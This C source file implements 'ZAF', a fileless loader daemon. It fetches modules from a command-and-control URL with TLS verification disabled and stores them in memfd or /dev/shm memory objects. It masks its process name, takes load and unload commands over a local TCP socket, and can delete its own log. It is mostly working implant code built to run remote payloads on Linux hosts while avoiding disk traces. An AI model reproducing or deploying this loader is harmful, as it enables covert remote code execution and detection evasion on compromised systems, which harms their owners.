/* 
 *                 === ZAF ===
 *
 *   Background daemon used to assist in loading remote modules in memory
 *   via several available METHODS and presenting them to out of process operators 
 *   for consumption 
 *
 *   METHODS: 
 *     1.POSIX shm_open
 *     2.memfd_create(2) 
 *
 *
 *   CAPABILITIES:
 *
 *
 * Ref: some code from https://x-c3ll.github.io/posts/fileless-memfd_create */


#define _GNU_SOURCE


#include <stdio.h>
#include <curl/curl.h>
#include <cJSON.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <signal.h>
#include <netinet/tcp.h>
#include <unistd.h>
#include <errno.h>

#include "zaf.h"




// Returns a file descriptor where we can write our shared object
// TODO: refactor
int open_ramfs(Shared_Mem_Fd * smf) {

    int shm_fd = 0;
    char s[6] = {}; //TODO: parameterize

    gen_random(s, 6);//TODO: parameterize 

	if (memfd_kv_s.memfd_supp == 0) {
		shm_fd = shm_open(s, O_RDWR | O_CREAT, S_IRUSR|S_IRUSR|S_IRGRP|S_IRGRP|S_IRGRP|S_IRGRP);
		if (shm_fd < 0) { 
			log_fatal("RamWorker: shm_fd: Could not open file descriptor");
			return 0;
		}
        smf->shm_type=1; //shm
	}
	else {
		shm_fd = memfd_create(s, MFD_ALLOW_SEALING); // flags?
		if (shm_fd < 0) { 
			log_fatal("RamWorker: memfd_create: Could not open file descriptor\n");
			return 0;
		}
        smf->shm_type=2; //memfd
	}

    smf->shm_fd=shm_fd;
    memcpy(smf->shm_mname, s, 6);//TODO: parameterize
	return shm_fd;
}

// Download payload from a C&C via HTTPs
// TODO: refactor
int download_to_RAM(char *downloadUrl, char *fileName) { 

	CURL *curl;
	CURLcode res;
	int shm_fd = 0;
    FILE * shm_file;
    Shared_Mem_Fd shm_fd_s = {
        .shm_fd=0, 
        .shm_fname={0}, 
        .shm_mname={0}, 
        .shm_type=0 
    };

    // Save fileName in object record
    if ( strlen(fileName) < SHM_NAME_MAX ){
        memcpy(shm_fd_s.shm_fname, fileName, strlen(fileName) );
    }else{
        memcpy(shm_fd_s.shm_fname, fileName, SHM_NAME_MAX -1 );
    }

    // TODO: decide between shm_fd and status as return since we set up shm_fd via the struct passed in
	shm_fd = open_ramfs(&shm_fd_s); // Give me a file descriptor to memory

    if ( shm_fd == 0 || shm_fd_s.shm_fd == 0){ // memory not allocated - return
	    log_debug("RamWorker: File Descriptor Shared Memory NOT created! Bailing.");
        return shm_fd;
    }

	log_info("RamWorker: File Descriptor %d Shared Memory created", shm_fd_s.shm_fd);
	log_debug("RamWorker: Passing URL to cURL: %s", downloadUrl);

    // TODO: parameterize to HTTP/HTTPS/etc.
    // TODO: test HTTPS, check cert validation
    curl_global_init(CURL_GLOBAL_DEFAULT);    
	curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, downloadUrl);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
		curl_easy_setopt(curl, CURLOPT_USERAGENT, ZCURL_AGENT);
       
        // WARNING: fdopen(3) The result of applying fdopen() to a shared memory object is undefined. 
        // So far works but TODO: test across platforms. Most likely file semantics are preserved
        // but the behavior is undefined due to fcntl things like SEALS
        shm_file=fdopen(shm_fd_s.shm_fd, "w"); 
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, shm_file); 
		
		res = curl_easy_perform(curl);
		if (res != CURLE_OK && res != CURLE_WRITE_ERROR) {
			log_error("cURL: cURL failed: %s", curl_easy_strerror(res));
            cleanup_mod_resources(shm_fd);
            return 0;
		}
		curl_easy_cleanup(curl);
		return shm_fd;
	}

    return shm_fd;
}

void cleanup_mod_resources(int shm_fd){

    char procpath[1024]; // TODO: what should this be? parameterize
    char *shmpath;
    struct stat sb;
    

    // shm option: cleanup lingering file in /dev/shm
    if (memfd_kv_s.memfd_supp == 0) { 
        snprintf(procpath, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);

        if (lstat(procpath, &sb) != -1){
            shmpath = realpath(procpath, NULL);
            if (shmpath != NULL)
            {
                log_info("Cleanup: unlinking %s -> %s", procpath, shmpath);
                unlink(shmpath); // TODO: make provisions for shm_unlink
                free(shmpath);
            }
        }
    }
    
    // memfd and shm options;
    log_debug("Cleanup: Closing shm_fd: %d", shm_fd);
    close(shm_fd); 

    // mark unloaded in ShmMemTbl
    mark_delete_mod(head, shm_fd);
}

int setMemfdTbl(int shm_fd, char* mname) {
    char path[1024]; // TODO: what should this be?
    char mstate[] = "L"; //Loaded
    
    // TODO: Allow commands to seal the modules that would never be modified
    //unsigned int seals =  F_SEAL_GROW | F_SEAL_SHRINK | F_SEAL_WRITE | F_SEAL_SEAL;
    unsigned int seals =  F_SEAL_SEAL;

    log_debug("MemTbl: Populating Index Table");
    if (memfd_kv_s.memfd_supp == 1) { 

	    log_debug("MemTbl: memfd_create() is supported.");
	    log_debug("MemTbl: Sealing modules.");
        if (fcntl(shm_fd, F_ADD_SEALS, seals) == -1)
	        log_error("MemTbl: fcntl(): Sealing modules failed");

        snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
    } else { 
        snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd); 
	    log_debug("MemTbl: only /dev/shm supported.");
    }

    if (check_empty(head) == 0) {
        log_debug("Memtbl: Head of list empty");
        head = calloc(1,sizeof(node_t));
        if (head == NULL) {
		    log_fatal("MemTble: calloc() failed");
            return 1;
        }
        push_first(head, shm_fd, path, mname, mstate);
    }else{
        push(head, shm_fd, path, mname, mstate);
    }
    return 0;
}


int main (int argc, char **argv) {

    argv = save_ps_display_args(argc, argv);
    init_ps_display("zaf"); // TODO: parmeterize

    fp = fopen (logFile,"w");
    if (fp == NULL) {
        log_error("ZAF: Log File not created okay, errno = %d", errno);
    }else{
        log_set_fp(fp); 
        //log_set_level(2); //  "TRACE", "DEBUG", >"INFO"<, "WARN", "ERROR", "FATAL"
        log_set_level(1);  // TODO: paramterize
        log_set_quiet(logquiet); // TODO: parameterize
    }

	log_info("=== ZAF ===\n"); // parameterize
    //backgroundDaemonLeader();
    doWork();

    fclose (fp);
	return 0;
}

void doWork(){

    char urlbuf[255] = {'\0'}; // TODO: what should this be?
    int  i;

    if (checKernel() == 1){
	    log_info("Worker: memfd_create() support seems to be available.");
    }else{
	    log_info("Worker: /dev/shm fallback. memfd_create() support is not available.");
    }

    log_debug("Worker: Trying for C2 download initial modules (if any)...");

    for(i = 0; i < sizeof(modules)/sizeof(modules[0]); i++)
    {
        snprintf(urlbuf, sizeof(urlbuf), "%s%s", ccurl, modules[i]);
        log_debug("Worker: Module URL = %s", urlbuf);
        load_mod(head, urlbuf);
    }
    
    setupCmdP();

}

int setupCmdP(){

    // TODO: Allow Unix domain sockets
    unsigned int portno, clilen, sockfd, newsockfd;
    struct sockaddr_in serv_addr, cli_addr; // AF_INET
    // struct sockaddr_un serv_addr_un; // AF_UNIX
    int one = 1;

    /* First call to socket() function */
    sockfd = socket(AF_INET, SOCK_STREAM, 0); // AF_INET
    // sockfd = socket(AF_UNIX, SOCK_STREAM, 0);   // AF_UNIX

    if (sockfd < 0) {
      log_error("Error opening socket()");
      return -1;
    }


    bzero((char *) &serv_addr, sizeof(serv_addr));
    portno = 0; // random port // TODO: parameterize

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(0x7f000001L); // 127.0.0.1 // TODO: parameterize
    serv_addr.sin_port = htons(portno);

    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
      log_error("Error on bind()");
      return -1; // TODO: make a pass to check all return codes to make them consistent
    }
    setsockopt(sockfd, SOL_TCP, TCP_NODELAY, &one, sizeof(one));
    listen(sockfd,5); // TODO: paramterize

    log_info("Listening on port"); // TODO: provide the port
    clilen = sizeof(cli_addr);

    /* AF_UNIX 
    bzero((char *) &serv_addr_un, sizeof(serv_addr_un));
    strcpy(serv_addr_un.sun_path, "/tmp/zsock");
    listen(sockfd,5);
    */

    while (1) {
        
      log_info("Accepting requests");
      newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);

      if (newsockfd < 0) {
         log_error("Error on accept()");
         continue;
      }

      // We are not forking as we want to to preserve the PID for /proc/ FD's
      processCommandReq(newsockfd, head);
      close(newsockfd);
    }

    return 0;
}


// TODO: is there a better way to handle commands as the grow. Also, refactor
int processCommandReq (int sock, node_t * head) {
   int  n = 0;
   char buffer[MAX_BUF];
   int  status = 0;

   cJSON * root         = NULL;
   cJSON * cmdName      = NULL;

   cJSON * loadmod_arg  = NULL;
   cJSON * loadmod_args = NULL;
   cJSON * modUrl       = NULL;
   cJSON * modName      = NULL;


   bzero(buffer,MAX_BUF);
   n = read(sock,buffer,MAX_BUF-1);

   if (n < 0) {
      log_error("Error reading from socket");
      return -1;
   }

   log_info("Request payload: >> %s <<",buffer);

   // Rudimentary checks for JSON. this library is SIGSEGV if invalid. We take that chance for now.
   // TODO: test if needed since wwe have implemented cJSON_Parse()
   if ( strchr(buffer, '}') == NULL \
                || strchr(buffer, '{') == NULL  \
                || strchr(buffer, '"') == NULL ){

        log_debug("Possibly invalid JSON, not parsing: %s", buffer); // not processing
        return 1;
   }

   root = cJSON_Parse(buffer);

   if (root == NULL)
   {
        log_warn("JSON: Error parsing");
        status=1;
        goto end;
   }

   cmdName = cJSON_GetObjectItemCaseSensitive(root, "command");

   if (cJSON_IsString(cmdName) && (cmdName->valuestring != NULL))
   {
     if (strcmp(cmdName->valuestring, "listmod") == 0) // TODO: allow short condensed string
     {
       log_debug("[Command] : %s", cmdName->valuestring);
       write_modlist(head, sock);
       status=1;
       goto end;

     }
     else if (strcmp(cmdName->valuestring, "loadmod") == 0)
     {

       loadmod_args = cJSON_CreateArray();
       if (loadmod_args == NULL)
       {
           log_debug("[Command] loadmod : cJSON_CreateArray()");
           status=1;
           goto end;
       }

       log_debug("[Command] : %s", cmdName->valuestring);
       loadmod_args = cJSON_GetObjectItemCaseSensitive(root, "args");
       cJSON_ArrayForEach(loadmod_arg, loadmod_args)
       {
           modUrl = cJSON_GetObjectItemCaseSensitive(loadmod_arg, "modurl");
           log_debug("[Command] : modurl (%s)", modUrl->valuestring);
           load_mod(head, modUrl->valuestring);
           goto end;
       }
     }
     else if (strcmp(cmdName->valuestring, "unloadmod") == 0)
     {
       loadmod_args = cJSON_CreateArray();
       if (loadmod_args == NULL)
       {
           log_debug("[Command] loadmod : cJSON_CreateArray()");
           status=1;
           goto end;
       }

       log_debug("[Command] : %s", cmdName->valuestring);
       loadmod_args = cJSON_GetObjectItemCaseSensitive(root, "args");
       cJSON_ArrayForEach(loadmod_arg, loadmod_args)
       {
           modName = cJSON_GetObjectItemCaseSensitive(loadmod_arg, "modname");
           log_debug("[Command] : modname (%s)", modName->valuestring);
           unload_mod(head, modName->valuestring);
           goto end;
       }
     }
     else {
       log_debug("Command request (%s)", cmdName->valuestring);
     }
   }

end:
   cJSON_Delete(root);

   return status;

}
// ------------------- Node table ----------------
// TODO: try to implement node deletion 
int check_empty(node_t * head){
    int empty  = (head == NULL) ? 0 : 1;
    return empty;
}

int list_sz(node_t * head) {
    node_t * current = head;
    int c = 1;
    while (current != NULL) {
        c++;
        current = current->next;
    }
    return c;
}

int mod_name2fd(node_t * head, char * name, int loaded) {
    node_t * current = head;
    int found=0;

    while (current != NULL) {
        if ( strncmp(current->mname, name, sizeof(current->mname)) == 0){
          log_debug("FindMod: found entry %s", current->mname);

          if (loaded){
              if (strncmp(current->mstate,"U", strlen("U")) == 0 ){
                  current = current->next;
                  continue; 
              }
              found=1;
              break;
              
          }else{
            found=1;
            break;
          }
        }
        current = current->next;
    }

    if (found){
        return current->fd; 
    }
    return 0;
}

char * mod_name2path(node_t * head, char * name) {
    node_t * current = head;
    char * empty = "";
    int found=0;

    while (current != NULL) {
        if ( strncmp(current->mname, name, sizeof(current->mname)) == 0){
          log_debug("FindMod: found entry %s", current->mname);
          found=1;
          break;
        }
        current = current->next;
    }

    if (found){
        return strdup(current->mpath); 
    }
    return empty;
}

void write_modlist(node_t * head, int sock) {
    node_t * current = head;
    int n, ret;
    char * entry;

    if (current == NULL) {
        n = write(sock,"",1);
        if (n < 0)
          log_error("Error writing to socket");
    }

    while (current != NULL) {
        entry = calloc(1, MAX_BUF);

		ret = snprintf(entry, MAX_BUF-1, "%d :(%s): %s : %s\n", current->fd, current->mstate, current->mpath, current->mname);
        if (ret < 0) {
         free(entry);
         continue;
        }

        n = write(sock,entry,strlen(entry));

        if (n < 0) {
          log_error("Error writing to socket");
        }
        free(entry);
        current = current->next;
    }
}

int unload_mod(node_t * head, char * name) {
    int modfd   = 0;
    int status  = 0;
    int loaded  = 1; // TODO: why is it here? 

    modfd = mod_name2fd(head, name, loaded);
    if ( modfd != 0 ){
       log_debug("Worker: Module fd found %d", modfd);
       status = 1;
       log_debug("Worker: Closing OS process fd %d", modfd);
       cleanup_mod_resources(modfd);
       //log_debug("Worker: Removing data from memory for fd %d", modfd);
       //mark_delete_mod(head, modfd); // from ShmMemTbl
    }else{
       log_debug("Worker: Module fd not found");
    }

    return status;
}

int find_mod(node_t * head, char * name) {
    
    char* modname   = NULL;
    int   status    = 0;

    modname = mod_name2path(head, name);
    if ((modname != NULL) && (modname[0] != '\0')) {
        log_debug("Worker: Module found %s", modname);
        status = 1;
    }else{
        log_debug("Worker: Module not found %s", modname);
    }

    return status;
}

// TODO: is load the same as activate? Should we have it as separate action?
int load_mod(node_t * head, char * url) {

    int fd; // TODO: do we or don;t we need to set ints to 0

    CURLU       *h;
    CURLUcode   uc;
    char        *path, *cpath=NULL;

    h = curl_url();
    if(!h){
        log_debug("LoadMod: Unable to get cURL object\n");
        return 1;
    }

    uc = curl_url_set(h, CURLUPART_URL, url, 0);
    if(uc)
      goto clean;


    // Get file name
    uc = curl_url_get(h, CURLUPART_PATH, &path, 0);
    if(!uc) {
        log_debug("Path: %s (%d)b\n", path, strlen(path));
        if (path[0] == '/') {// remove slash
            cpath = calloc(strlen(path)-1, sizeof(char));
            memcpy(cpath, path+1, strlen(path)-1);
        }
    }

    // Download file to memory
    log_debug("LoadMod: Downloading %s -> %s", url, path);
    fd = download_to_RAM(url, cpath);
    if (fd != 0){
        log_debug("LoadMod: fetched OK, setting Mem table");
        setMemfdTbl(fd, cpath );
    }

clean:
    free(cpath);
    curl_free(path);
    curl_url_cleanup(h); /* free url handle */

    return 0;
}

//delete a link with given key
// TODO: implement size and type in status
int mark_delete_mod(node_t * head, int fd) {

   node_t * current = head;
   int status       = 0;
   char state[]     = "U";

   if(head == NULL)
      return status;

   while (current != NULL) {
      if ( current->fd == fd ){ // found
          strncpy(current->mstate, state, strlen(state));
      }
      current = current->next;
   }

   return status;
}

int push_first(node_t * head, int shm_fd, char* path, char* mname, char mstate[]) {

    log_debug("ModTable: Adding path %s, strlen(path): %d name: %s strlen(name): %d", path, strlen(path), mname, strlen(mname));
    head->fd = shm_fd;
    strncpy(head->mpath, path, strlen(path));
    strncpy(head->mname, mname, strlen(mname));
    strncpy(head->mstate, mstate, strlen(mstate));
    head->next = NULL;
    log_debug("ModTable: Added: %s : %s", head->mname, head->mpath);

    return 0;
}

int push(node_t * head, int shm_fd, char* path, char* mname, char mstate[]) {
    node_t * current = head;

    log_debug("ModTable: Adding path %s, strlen(path): %d name: %s strlen(name): %d", path, strlen(path), mname, strlen(mname));

    while (current->next != NULL) {
        current = current->next;
    }

    current->next = calloc(1,sizeof(node_t));
    if (current == NULL) {
        log_fatal("ModTable: calloc() failed");
        return 1;
    }

    current->next->fd = shm_fd;
    strncpy(current->next->mpath, path, strlen(path));
    strncpy(current->next->mname, mname, strlen(mname));
    strncpy(current->next->mstate, mstate, strlen(mstate));
    current->next->next = NULL;
    log_debug("ModTable: entry: %s : %s", current->mname, current->mpath);

    return 0;
}

void cleanup(int cleanLog){
    struct stat sb;

    fclose(fp);

    if (cleanLog) {
        if (lstat(logFile, &sb) != -1){
            unlink(logFile);
        }
    }
}

